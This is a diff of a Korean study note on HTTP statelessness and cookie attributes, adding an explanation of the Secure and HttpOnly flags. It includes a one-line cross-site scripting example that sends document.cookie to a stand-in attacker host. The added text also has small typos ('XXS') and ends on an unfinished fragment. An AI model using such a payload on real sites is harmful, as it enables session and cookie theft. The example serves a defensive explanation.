@@ -12,7 +12,6 @@ tags:
 ### HTTP 프로토콜의 특징
 
 - **비연결지향 (Connectionless)**: 클라이언트가 서버에게 Request를 보내고 서버가 클라이언트에게 Response를 보내면 접속을 종료한다.
-
 - **무상태 (Stateless)**: 통신이 끝나면 상태 정보를 유지하지 않는다.
 
 즉, 클라이언트의 로그인 정보나 브라우저에서 입력한 값 등이 페이지를 이동할 때 마다 초기화 되는 것입니다. 이러한 문제점을 해결하기 위해 데이터 저장에 사용하는 것이 **쿠키**, **세션** 그리고 **웹 스토리지**입니다.
@@ -72,6 +71,21 @@ Path=/docs 의 쿠키가 포함되는 서브디렉토리의 예
 - /docs/Web/
 - /docs/Web/HTTP
 ```
+
+**Secure** 속성은 HTTPS 프로토콜로 암호화 된 요청일 경우에만 쿠키가 포함됩니다. 하지만 Secure 속성을 추가하더라도 안전하다고 볼 수 없기 때문에 민감한 정보는 쿠키에 추가해서는 안됩니다.
+
+**HttpOnly** 속성은 자바스크립트의 `Document.cookie` API를 통 에 의해 쿠키가 접근되는 것을 방지합니다. 이를 통해 인증된 정보를 자바스크립트를 통해 탈취하는 Cross-site 스크립팅(XXS) 공격을 막는데 도움을 줍니다.
+
+```
+Set-Cookie: password=DontDoThat; Secure; HttpOnly
+```
+
+Cross-site 스크립팅(XXS) 공격의 예
+```
+(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+```
+
+과 **HttpOnly** 
 
 ### Reference
 
